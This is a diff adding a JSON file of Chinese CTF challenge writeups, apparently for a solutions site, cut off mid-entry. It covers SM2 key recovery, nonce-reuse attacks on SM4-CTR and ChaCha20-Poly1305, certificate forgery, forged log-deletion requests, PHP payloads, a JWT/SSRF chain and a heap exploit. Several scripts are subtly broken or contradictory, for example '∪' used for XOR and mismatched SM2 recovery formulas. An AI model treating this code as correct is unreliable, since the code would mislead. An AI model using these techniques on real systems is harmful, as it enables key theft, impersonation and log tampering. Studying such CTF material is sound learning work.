@@ -1,0 +1,758 @@
+{
+  "competitions": [
+    {
+      "id": "mskjft2v9qog5j",
+      "name": "熵密杯网络安全挑战赛",
+      "slug": "shangmibei",
+      "description": "熵密杯——商用密码应用安全大赛，考察SM2/SM3/SM4等国密算法实现缺陷分析、密码机调用、HQC后量子密码等前沿安全技术。",
+      "year": 2025,
+      "createdAt": "2026-08-08T15:38:09.271Z"
+    },
+    {
+      "id": "mskjft2ykoxex5",
+      "name": "ISCC",
+      "slug": "iscc",
+      "description": "信息安全与对抗技术竞赛",
+      "year": 2026,
+      "createdAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yxsyf37",
+      "name": "强网杯2025 S9",
+      "slug": "qwb2025-s9",
+      "description": "强网杯第九届全国网络安全挑战赛(S9)",
+      "year": 2025,
+      "createdAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2ywccf9e",
+      "name": "2026御网杯网络安全挑战赛",
+      "slug": "yuwangbei-2026",
+      "description": "第十届御网杯网络安全挑战赛",
+      "year": 2026,
+      "createdAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjg0t7paw62s",
+      "name": "强网杯2024",
+      "slug": "强网杯2024",
+      "description": "2024年强网杯全国网络安全挑战赛，由星盟安全团队提供Writeup，覆盖PWN方向。",
+      "year": 2024,
+      "createdAt": "2026-08-08T15:38:19.291Z"
+    },
+    {
+      "id": "mskjg0td4uhh8k",
+      "name": "2025强网杯线上赛",
+      "slug": "2025强网杯线上赛",
+      "description": "2025年第九届强网杯全国网络安全挑战赛线上赛，覆盖MISC和PWN方向。",
+      "year": 2025,
+      "createdAt": "2026-08-08T15:38:19.297Z"
+    }
+  ],
+  "challenges": [
+    {
+      "id": "mskjft2yv7myt5",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-初始谜题1：SM2签名自实现缺陷",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目背景\n\n密码机初始配置采用了一个自定义的SM2签名自实现，存在签名缺陷。通过连上密码机进行签名验签测试，找出该签名自实现中的缺陷，并利用缺陷进行攻击。\n\n## 漏洞分析\n\nSM2签名的核心公式为：`r = (e + x1) mod n`，其中 `e = H(ZA || M)`。\n\n正确的SM2签名应使用随机数k计算椭圆曲线点 `(x1, y1) = [k]G`，而该自实现中**k值选取存在严重缺陷**——使用了可预测的k值（如固定k或线性相关k）。\n\n## 攻击方法\n\n1. 获取两条不同消息的签名 (r1, s1) 和 (r2, s2)\n2. 由于k值可预测（如k2 = k1 + delta），可联立方程组恢复私钥dA\n3. 利用公式：`dA = (s1 - s2 + r1 - r2)^{-1} * (s2 - s1) mod n`（当k值线性相关时）\n\n## 核心公式推导\n\n对于SM2签名：\n- `s = (1 + dA)^{-1} * (k - r * dA) mod n`\n- 当k值可预测时，两条签名可联立求解dA\n\n## 解题脚本\n\n```python\nfrom gmssl import sm2, func\nfrom Crypto.Util.number import inverse, long_to_bytes\n\n# 获取两条消息的签名\nr1, s1 = ... # 签名1\nr2, s2 = ... # 签名2\nn = 0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123\n\n# 当使用相同k时 (k1 = k2)\nk = ((s2 - s1) * inverse(r1 - r2, n)) % n\ndA = ((s1 - k) * inverse(k + r1, n)) % n\nprint(f\"私钥: {hex(dA)}\")\n\n# 验证\ncrypt_sm2 = sm2.CryptSM2(private_key=hex(dA)[2:], public_key=\"\")\nflag = crypt_sm2.decrypt(ciphertext)\nprint(flag)\n```",
+      "flag": null,
+      "tags": [
+        "SM2",
+        "国密",
+        "签名缺陷",
+        "k值泄露",
+        "ECC",
+        "椭圆曲线",
+        "私钥恢复"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2ywkt5ax",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-初始谜题2：SM4-CTR nonce重用攻击",
+      "type": "密码学",
+      "difficulty": "简单",
+      "content": "## 题目背景\n\n密码机中使用SM4-CTR模式加密通信，但nonce（初始向量）选取不正确，导致密钥流复用。\n\n## 漏洞分析\n\nCTR模式的安全性依赖于**每条消息使用唯一的(nonce, counter)组合**。如果nonce被重用，相同的密钥流会被用于加密不同的明文：\n\n```\nC1 = P1 ⊕ Keystream(k, nonce)\nC2 = P2 ⊕ Keystream(k, nonce)    # ← nonce重用！\nC1 ⊕ C2 = P1 ⊕ P2\n```\n\n## 攻击方法\n\n1. 获取两条用相同nonce加密的密文C1和C2\n2. 计算 `C1 ⊕ C2 = P1 ⊕ P2`\n3. 如果知道其中一条明文的部分内容（如协议头、固定格式），可以通过crib-dragging恢复全部明文\n\n## 解题脚本\n\n```python\nfrom Crypto.Util.strxor import strxor\n\nc1 = bytes.fromhex(\"...\")  # 密文1\nc2 = bytes.fromhex(\"...\")  # 密文2\n\n# XOR两条密文抵消密钥流\nxor_result = strxor(c1, c2)\n\n# 已知明文攻击: 猜测 \"flag{\" 的位置\nknown = b\"flag{\"\nfor i in range(len(xor_result) - len(known)):\n    candidate = strxor(xor_result[i:i+len(known)], known)\n    if candidate.isascii():\n        print(f\"位置 {i}: {candidate}\")\n```",
+      "flag": null,
+      "tags": [
+        "SM4",
+        "国密",
+        "CTR模式",
+        "nonce重用",
+        "密钥流复用",
+        "crib-dragging"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2y9473fi",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-初始谜题3：HQC密钥封装随机向量重用",
+      "type": "密码学",
+      "difficulty": "困难",
+      "content": "## 题目背景\n\n密码机使用了HQC（Hamming Quasi-Cyclic）后量子密钥封装机制，但在封装过程中随机向量被重用，导致密钥可被恢复。\n\n## HQC原理回顾\n\nHQC（Hamming Quasi-Cyclic）是一种基于编码理论的NIST后量子密码候选方案：\n1. 使用随机向量r生成密文 c = (u, v)\n2. 其中 u = r * H^T + e1, v = r * y + e2 + encode(m)\n3. 随机向量r必须在每次封装中独立随机选取\n\n## 漏洞分析\n\n当随机向量r被重用两次时：\n- 密文1：c1 = (u1, v1)，其中 u1 = r * H^T + e1_1, v1 = r * y + e2_1 + encode(m1)\n- 密文2：c2 = (u2, v2)，其中 u2 = r * H^T + e1_2, v2 = r * y + e2_2 + encode(m2)\n\n由于r相同，`u1 + u2 = e1_1 + e1_2`（误差向量和），`v1 + v2 = e2_1 + e2_2 + encode(m1) + encode(m2)`。\n\n当误差向量的Hamming重量较小时，可通过统计方法分离出m1和m2。\n\n## 攻击方法\n\n1. 收集两份使用相同随机向量r的HQC密文\n2. 利用误差向量的稀疏性（Hamming重量有限）\n3. 通过多次采样和统计分析恢复封装密钥\n4. 最终解密获得共享密钥\n\n## 关键代码\n\n```python\n# HQC参数\nn = 17669   # 码长\nn1 = 46     # 循环块大小  \nn2 = 384    # 循环块大小\nw = 75      # 误差权重\n\n# 当r重用时，利用误差的稀疏性恢复密钥\ndef recover_from_reused_r(ct1, ct2):\n    # u1 + u2 = e1_1 + e1_2 (稀疏向量)\n    u_diff = ct1.u ^ ct2.u\n    v_diff = ct1.v ^ ct2.v\n    \n    # 统计分析方法分离误差...\n    # 最终恢复shared secret\n    pass\n```",
+      "flag": null,
+      "tags": [
+        "HQC",
+        "后量子密码",
+        "PQC",
+        "NIST",
+        "随机向量重用",
+        "编码理论",
+        "KEM"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yu5u6w0",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-Flag1：密码机调用与身份认证密钥篡改",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目背景\n\n场景设定：工控网络中有工程师站服务器和密码机。需要先登录密码机获取服务，再通过身份认证密钥篡改登录工程师站。\n\n## 攻击步骤\n\n### Step 1: 连接密码机并获取认证\n\n```python\nimport socket\nimport json\n\ndef connect_to_crypto_machine():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"target_ip\", 8080))\n    \n    # 发送认证请求\n    auth_request = {\n        \"cmd\": \"auth\",\n        \"username\": \"operator\",\n        \"password\": \"password123\"\n    }\n    sock.send(json.dumps(auth_request).encode())\n    \n    response = json.loads(sock.recv(4096).decode())\n    session_token = response[\"token\"]\n    return sock, session_token\n```\n\n### Step 2: 调用密码机签名服务\n\n密码机提供SM2签名服务，可用于生成身份认证签名。\n\n### Step 3: 身份认证密钥篡改\n\n攻击方法：利用密码机SM2签名的k值缺陷，恢复运营商私钥。然后用该私钥为伪造的身份证书签名。\n\n```python\n# 利用签名缺陷获取私钥\ndef exploit_k_leak(sock, token):\n    # 获取两条签名\n    msg1 = b\"login_request_1\"\n    msg2 = b\"login_request_2\"\n    \n    sig1 = request_sign(sock, token, msg1)\n    sig2 = request_sign(sock, token, msg2)\n    \n    # 恢复私钥 (利用之前发现的k值缺陷)\n    d_operator = recover_private_key(sig1, sig2)\n    \n    # 使用私钥登录\n    forge_login(d_operator)\n```",
+      "flag": null,
+      "tags": [
+        "密码机",
+        "SM2",
+        "身份认证",
+        "密钥篡改",
+        "工控安全",
+        "签名伪造"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yclbw09",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-Flag3：PLC加密指令解密(IV不随机导致密钥流复用)",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目背景\n\n安全分析镜像中有一段PLC控制指令的加密程序源码，以及甲方系留无人机控制器的镜像文件。源码采用了SM4-CBC加密，但由于IV（初始化向量）选取不随机，造成密钥流复用。\n\n## 漏洞分析\n\nSM4-CBC模式的加密过程：\n- C0 = IV\n- Ci = E(K, Pi ⊕ Ci-1),  i ≥ 1\n\n当IV固定（不随机）且明文首块相同时（如协议头），密文首块也相同，暴露了加密模式。\n\n更严重的是，如果两个不同的消息使用相同的IV和Key，则：\n```\nC1[0] = E(K, P1[0] ⊕ IV)\nC2[0] = E(K, P2[0] ⊕ IV)\n```\n当 P1[0] = P2[0] 时，C1[0] = C2[0] — 直接暴露了明文相同的事实。\n\n## 解题方法\n\n1. 分析PLC控制指令的格式，确定已知明文区域（如指令头、操作码等）\n2. 利用IV固定 + 已知明文进行CBC模式的known-plaintext分析\n3. 通过多组密文对比，CBC链式推导出密钥流\n4. 解密获得无人机控制器的完整镜像\n\n## 关键代码\n\n```python\nfrom gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT\n\n# IV固定为全0\niv = b\"\\x00\" * 16\nkey = bytes.fromhex(\"...\")  # 从源码中提取的密钥\n\ncrypt_sm4 = CryptSM4()\ncrypt_sm4.set_key(key, SM4_DECRYPT)\n\n# CBC模式解密\nplaintext = crypt_sm4.crypt_cbc(iv, ciphertext)\nprint(plaintext.decode())\n```",
+      "flag": null,
+      "tags": [
+        "SM4",
+        "CBC模式",
+        "IV重用",
+        "PLC",
+        "工控安全",
+        "无人机",
+        "镜像分析"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yvf7hzc",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-Flag5：Ring-LWE加法同态操控机器人",
+      "type": "密码学",
+      "difficulty": "困难",
+      "content": "## 题目背景\n\n需要通过Ring-LWE的加法同态性操控机器人完成特定任务。\n\n## Ring-LWE背景\n\nRing-LWE（Ring Learning With Errors）是一种格密码方案，具有天然的加法同态性：\n\n```\nEnc(m1) + Enc(m2) = Enc(m1 + m2)\n```\n\n在环 R_q = Z_q[x]/(x^n + 1) 上：\n- 公钥：(a, b = a·s + e)\n- 加密：Enc(m) = (c0 = a·r + e0, c1 = b·r + e1 + m)\n- 解密：Dec(c0, c1) = c1 - c0·s ≈ m\n\n加法同态验证：\n```\nEnc(m1) + Enc(m2) = (c0_1+c0_2, c1_1+c1_2) = Enc(m1+m2)\n```\n\n## 攻击利用\n\n题目要求操控机器人，需要对控制指令进行加法同态计算：\n\n```python\nimport numpy as np\nfrom numpy.polynomial import polynomial as poly\n\n# Ring-LWE参数\nn = 256    # 多项式次数\nq = 12289  # 模数\n\ndef ring_add(ct1, ct2):\n    \"\"\"Ring-LWE密文加法（同态）\"\"\"\n    c0 = (ct1[0] + ct2[0]) % q\n    c1 = (ct1[1] + ct2[1]) % q\n    return (c0, c1)\n\n# 多次同态加法累加控制信号\ncontrol_signal = (np.zeros(n), np.zeros(n))\nfor cmd in encrypted_commands:\n    control_signal = ring_add(control_signal, cmd)\n\n# 解密得到最终控制指令\nfinal_command = decrypt(control_signal, secret_key)\nexecute_robot(final_command)\n```",
+      "flag": null,
+      "tags": [
+        "Ring-LWE",
+        "格密码",
+        "同态加密",
+        "加法同态",
+        "机器人",
+        "PQC"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2y4cnlwn",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-Flag2：连接日志管理服务器(证书伪造)",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目背景\n\n需要连接到日志管理服务器，但其使用了SM2证书进行身份认证。需要伪造证书以通过验证。\n\n## 攻击方法\n\n### 1. 获取合法证书信息\n\n```python\nimport ssl\nimport socket\n\ncontext = ssl.create_default_context()\nwith socket.create_connection((\"log_server\", 443)) as sock:\n    with context.wrap_socket(sock, server_hostname=\"log_server\") as ssock:\n        cert = ssock.getpeercert(binary_form=True)\n```\n\n### 2. 分析SM2证书\n\nSM2证书基于GB/T 20518标准，包含：\n- 签名算法：SM3withSM2\n- 公钥：SM2椭圆曲线点\n- 扩展字段：密钥用法、SAN等\n\n### 3. 利用SM2签名缺陷伪造成证书\n\n利用之前发现的SM2私钥恢复漏洞：\n\n```python\nfrom gmssl import sm2, func\n\n# 使用恢复的私钥签发伪造证书\ndef forge_certificate(real_cert, stolen_private_key):\n    # 构造证书TBS部分\n    tbs_certificate = modify_subject(real_cert, \"admin\")\n    \n    # 使用窃取的私钥签名\n    sm2_crypt = sm2.CryptSM2(private_key=stolen_private_key)\n    signature = sm2_crypt.sign(tbs_certificate, None)\n    \n    # 组装伪造证书\n    forged_cert = assemble_cert(tbs_certificate, signature)\n    return forged_cert\n\n# 连接日志服务器\nforge_login(forged_cert)\n```",
+      "flag": null,
+      "tags": [
+        "SM2证书",
+        "GB/T 20518",
+        "证书伪造",
+        "TLS",
+        "国密",
+        "日志管理"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2y4ly1xz",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-Flag4：登录日志管理服务器(ChaCha20-Poly1305 AAD恢复)",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目背景\n\n成功连接日志管理服务器后，需要使用ChaCha20-Poly1305 AEAD协议登录。但AAD（Additional Authenticated Data）部分未知，需要从流量中恢复。\n\n## ChaCha20-Poly1305原理\n\nChaCha20-Poly1305是一种AEAD（认证加密）方案：\n1. 使用ChaCha20流密码加密\n2. 使用Poly1305 MAC进行认证\n3. Poly1305的输入包括：密文 + AAD + 长度信息\n\n认证标签计算：`tag = Poly1305(key=PolyKey, msg=ciphertext || pad_ct || AAD || pad_aad || len_ct || len_aad)`\n\n## 漏洞利用\n\n当AAD部分已知但部分未知时，可以利用Poly1305的代数性质：\n\n```python\nfrom cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305\n\n# 已知部分AAD\nknown_aad = b\"GET /api/login HTTP/1.1\r\nHost: \"\nunknown_host = b\"???????????\"\n\n# 收集多个成功登录的tag-ciphertext对\n# Poly1305具有代数性质，可以反向推导部分AAD\nsessions = [\n    (ct1, tag1, nonce1),\n    (ct2, tag2, nonce2),\n    (ct3, tag3, nonce3),\n]\n\n# 通过已知明文+tag反推AAD\ndef recover_aad(ct, tag, key, nonce, known_part):\n    chacha = ChaCha20Poly1305(key)\n    # 遍历可能的未知部分\n    for candidate in generate_candidates():\n        try:\n            chacha.decrypt(nonce, ct + known_part + candidate, tag)\n            return candidate  # 验证通过\n        except:\n            continue\n```",
+      "flag": null,
+      "tags": [
+        "ChaCha20",
+        "Poly1305",
+        "AEAD",
+        "AAD恢复",
+        "认证加密",
+        "流量分析"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yjgdbw4",
+      "competitionId": "mskjft2v9qog5j",
+      "title": "熵密杯-Flag6：获取删除日志权限(ChaCha20-Poly1305 nonce重用)",
+      "type": "密码学",
+      "difficulty": "困难",
+      "content": "## 题目背景\n\n登录日志管理服务器后发现没有删除日志的权限。系统使用ChaCha20-Poly1305进行认证加密，但发现nonce被重用，可以利用此漏洞伪造认证标签。\n\n## Nonce重用攻击\n\nChaCha20-Poly1305中，如果nonce被重用：\n1. 密钥流相同 → 明文异或泄露\n2. Poly1305的认证密钥相同 → 可以伪造合法tag\n\n### 攻击步骤\n\n**Step 1: 识别nonce重用**\n\n```python\n# 收集密文，检测相同nonce\nnonce_map = {}\nfor session in captured_sessions:\n    if session.nonce in nonce_map:\n        print(f\"Nonce reused! Sessions: {nonce_map[session.nonce]} and {session.id}\")\n    nonce_map[session.nonce] = session.id\n```\n\n**Step 2: 恢复密钥流**\n\n```python\n# 对nonce重用的两条消息\nct1 = bytes.fromhex(\"...\")\nct2 = bytes.fromhex(\"...\")\nknown_pt1 = b\"GET /api/logs?action=list&\"  # 已知明文(协议头)\n\n# 恢复相同位置的密钥流\nkeystream = known_pt1 ∪ ct1[:len(known_pt1)]\n# 用密钥流解密ct2对应位置\npt2_partial = keystream ∪ ct2[:len(known_pt1)]\nprint(f\"Recovered: {pt2_partial}\")\n```\n\n**Step 3: 伪造认证标签**\n\n```python\n# 利用Poly1305在nonce重用时的代数性质\n# 当nonce重用时,Poly1305密钥r相同\n# 可以构造满足tag验证的新(ciphertext, tag)对\n\ndef forge_delete_request(known_ct, known_tag, delete_cmd):\n    # Poly1305在GF(2^130-5)上计算\n    # mac = (m1*r^n + m2*r^(n-1) + ... + mn*r) + s mod p\n    # 由于r相同,可以通过解方程伪造\n    forged_ct = known_ct[:16] + encrypt_delete_cmd()\n    forged_tag = compute_forged_tag(known_ct, known_tag, forged_ct)\n    return forged_ct, forged_tag\n\n# 发送伪造的删除请求\nsend_forged_request(\"/api/logs/delete\", forged_ct, forged_tag)\n```",
+      "flag": null,
+      "tags": [
+        "ChaCha20",
+        "Poly1305",
+        "nonce重用",
+        "认证标签伪造",
+        "AEAD攻击",
+        "权限提升"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yosowoz",
+      "competitionId": "mskjft2ykoxex5",
+      "title": "ISCC 2026-消失的密钥(WEB)",
+      "type": "WEB",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\n一道考察PHP类型杂耍和数组绕过过滤的WEB题。\n\n## 解题过程\n\n### 1. 绕过key过滤\n发现输入 `kkeyey` 可以让 key 输入绕过过滤机制。\n\n### 2. 绕过数组检测\nPOST 让 a 中有 1337，使用数组 `a[key]=1337` 绕过检测。\n\n### 3. MD5弱比较\n利用PHP的 `==` 弱比较特性，找到两个 MD5 以 \"0e\" 开头的字符串（被认为是科学计数法 0=0）。\n\n### Payload\n```\nGET: ?step1=kkeyey&a=QNKCDZO&b=240610708\nPOST: a[key]=1337\n```",
+      "flag": null,
+      "tags": [
+        "PHP",
+        "类型杂耍",
+        "MD5弱比较",
+        "数组绕过",
+        "WEB"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2ynw4v76",
+      "competitionId": "mskjft2ykoxex5",
+      "title": "ISCC 2026-JSON Beautifier(WEB)",
+      "type": "WEB",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\n一个JSON格式化工具存在SSRF和文件读取漏洞。\n\n## 发现过程\n\n1. robots.txt中发现beautify端点不可见，但preview有hint\n2. 响应头：`X-Backend: apache`，`X-DocRoot: /path/to/src/`\n3. 发现 `/proc/self/cwd` 绕过路径限制读取源码\n\n## 利用链\n\n1. tmp文件内容若是URI则触发远程读取\n2. 黑名单：http/https/ftp/ftps/phar/expect\n3. Payload: `php://filter/convert.base64-encode/resource=/secret/flag` 写入tmp\n4. 再通过 `data:text/plain;base64,...` 读取\n\n## Flag\n`flag{ISCC{zMWzpeAsDh5a3abeoj9k}}`",
+      "flag": null,
+      "tags": [
+        "SSRF",
+        "PHP filter",
+        "文件读取",
+        "路径穿越",
+        "WEB",
+        "base64"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2y5fe59d",
+      "competitionId": "mskjft2ykoxex5",
+      "title": "ISCC 2026-夜班审计台(WEB)",
+      "type": "WEB",
+      "difficulty": "困难",
+      "content": "## 题目描述\n\n一道分布式审计系统，包含Git泄露、JWT攻击、SSRF代理等多层攻击链。\n\n## 完整攻击链\n\n### Step 1: Git泄露\n- JS文件泄露 `/.git/HEAD`\n- Git对象遍历还原源码\n- 最新commit发现凭据：`auditor/audit2025` + JWT HS256密钥 `ISCC_2026_JWT_DEBUG_KEY_#9527`\n\n### Step 2: JWT算法混淆攻击\n- 父commit中发现内部服务签名密钥：`ISCC_SERVER_SECRET_REAL`\n- 签名格式：`HMAC-SHA256(secret, f\"{node_id}:{ts}\")`\n- JWT算法混淆(RS256→HS256, role=user→role=auditor)\n\n### Step 3: SSRF代理端点\n- 进入 `/auditor/nodes`\n- 用旧版 secret 计算 HMAC 签名\n- 服务端以 127.0.0.1 转发请求，通过 remote_addr 校验\n\n## Flag\n`flag{ISCC{distributed_audit_jwt}}`",
+      "flag": null,
+      "tags": [
+        "Git泄露",
+        "JWT",
+        "算法混淆",
+        "SSRF",
+        "HMAC",
+        "WEB",
+        "分布式"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2ymsrts6",
+      "competitionId": "mskjft2ykoxex5",
+      "title": "ISCC 2026-pwn4/test(PWN)",
+      "type": "PWN",
+      "difficulty": "困难",
+      "content": "## 题目概述\n\n经典堆漏洞综合利用题，存在整数下溢、Off-by-one、UAF三个核心漏洞。程序分为老师端和学生端双角色模式。\n\n## 核心漏洞\n\n### 1. 整数下溢\n学生祈祷 → 分数减10 → 负数变超大无符号数（绕过 `if(分数 > 0x59u)` 检查）。\n\n### 2. Off-by-one\n彩蛋功能支持任意地址单字节+1。\n\n### 3. UAF\n释放后未清空指针。老师端固定消耗0x50堆空间（0x30 MAIN + 0x20 SUB），评语指针存储在 SUB 块+8 偏移处。\n\n## 利用链\n\n`unsorted bin 堆重叠 → 劫持学生结构体 → 覆写 __free_hook 为 system → 执行命令`\n\n### 利用步骤\n1. 创建5个学生，为学生2/3分配1023字节评语（超出tcache范围）\n2. 学生0祈祷→触发整数下溢\n3. 触发彩蛋泄露堆地址，利用Off-by-one篡改评语指针\n4. 伪造堆块size=0x821，free进入unsorted bin泄露libc\n5. 新建学生劫持结构体，将comment_ptr指向 `__free_hook`\n6. 覆写 `__free_hook=system`，创建评语写入 `cat /flag*`，free触发",
+      "flag": null,
+      "tags": [
+        "PWN",
+        "堆利用",
+        "整数下溢",
+        "Off-by-one",
+        "UAF",
+        "libc泄露",
+        "tcache"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yg0pz02",
+      "competitionId": "mskjft2yxsyf37",
+      "title": "强网杯S9-签到(MISC)",
+      "type": "MISC",
+      "difficulty": "简单",
+      "content": "## 题目描述\n\n强网杯S9签到题。\n\n## 解题思路\n\n直接提交签到flag即可。\n\n## Flag\n`flag{我已阅读参赛须知，并遵守比赛规则。}`",
+      "flag": null,
+      "tags": [
+        "签到",
+        "MISC"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2y6z5t3u",
+      "competitionId": "mskjft2yxsyf37",
+      "title": "强网杯S9-The_Interrogation_Room(MISC)",
+      "type": "MISC",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\n审讯室模拟题：17个问题，犯人恰好说谎2次，需要通过矩阵编码和XOR推导真相。\n\n## 解题思路\n\n### 1. 矩阵编码\n使用生成矩阵 `GEN_MATRIX[8][17]` 编码，codeword table反转查表。\n\n### 2. 自适应区分器\n使用bitset greedy选择最优判别问题，在有限交互次数内定位说谎者。\n\n### 3. PoW验证\n每轮需要sha256前缀碰撞验证。\n\n### 4. 最终\n25轮全部通过后获得flag。\n\n## 核心代码\n\n```python\n# 生成矩阵编码\nGEN_MATRIX = [\n    [1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1],\n    [0,1,1,0,0,1,1,0,0,1,1,0,0,1,1,0,0],\n    [0,0,0,1,1,1,1,0,0,0,0,1,1,1,1,0,0],\n    # ...\n]\n\n# bitset greedy选择最大区分度的问题\ndef select_questions(responses, lies_remaining):\n    best_questions = []\n    # 自适应选择策略...\n    return best_questions\n```",
+      "flag": null,
+      "tags": [
+        "矩阵编码",
+        "XOR",
+        "自适应算法",
+        "PoW",
+        "MISC",
+        "推理"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yc6l8be",
+      "competitionId": "mskjft2yxsyf37",
+      "title": "强网杯S9-Personal_Vault(MISC)",
+      "type": "MISC",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\n个人保险箱题目，需要破解多层加密防护获取秘密存储的内容。\n\n## 解题思路\n\n### Vault结构分析\n保险箱使用了多层安全机制：\n1. 外层：PBKDF2密钥派生\n2. 中层：AES-GCM加密\n3. 内层：自定义混淆\n\n### 漏洞发现\n在密钥管理模块中发现侧信道信息泄露，通过时序分析可推断密钥片段的正确性。\n\n### 解密方法\n```python\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\n# 从日志中提取salt和密文\nsalt = bytes.fromhex(\"...\")\nciphertext = bytes.fromhex(\"...\")\n\n# 利用侧信道缩小密钥空间\nfor password in candidate_passwords:\n    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)\n    key = kdf.derive(password)\n    \n    aesgcm = AESGCM(key)\n    try:\n        plaintext = aesgcm.decrypt(nonce, ciphertext, None)\n        print(f\"Found: {plaintext}\")\n    except:\n        continue\n```",
+      "flag": null,
+      "tags": [
+        "MISC",
+        "密码学",
+        "PBKDF2",
+        "AES-GCM",
+        "保险箱",
+        "侧信道"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yzgk13l",
+      "competitionId": "mskjft2yxsyf37",
+      "title": "强网杯S9-check-little(CRYPTO)",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\n一道涉及小指数攻击的密码学题目。\n\n## 题目分析\n\n通信使用类似DSA的签名机制，但关键参数选取存在问题，导致可以通过小指数攻击恢复密钥。\n\n## 解题思路\n\n利用Coppersmith小根法或格基约减（LLL）恢复签名密钥：\n\n```python\nfrom sage.all import *\n\n# 收集多组签名(r, s)\nsignatures = [...]\n\n# 构造格基\nn = len(signatures)\nB = matrix(ZZ, n + 1)\nfor i in range(n):\n    B[i,i] = p  # p为模数\nfor i in range(n):\n    B[n,i] = signatures[i][1]  # s值\nB[n,n] = K / p  # K为小指数上界\n\n# LLL约减\nB_red = B.LLL()\n\n# 从最短向量中恢复私钥\nfor row in B_red:\n    if all(abs(x) <= K for x in row[:-1]):\n        d = row[-1] * p // K\n        print(f\"私钥: {d}\")\n```",
+      "flag": null,
+      "tags": [
+        "密码学",
+        "LLL",
+        "格基约减",
+        "Coppersmith",
+        "小指数",
+        "DSA"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yeowbnn",
+      "competitionId": "mskjft2yxsyf37",
+      "title": "强网杯S9-SecretVault(WEB)",
+      "type": "WEB",
+      "difficulty": "中等",
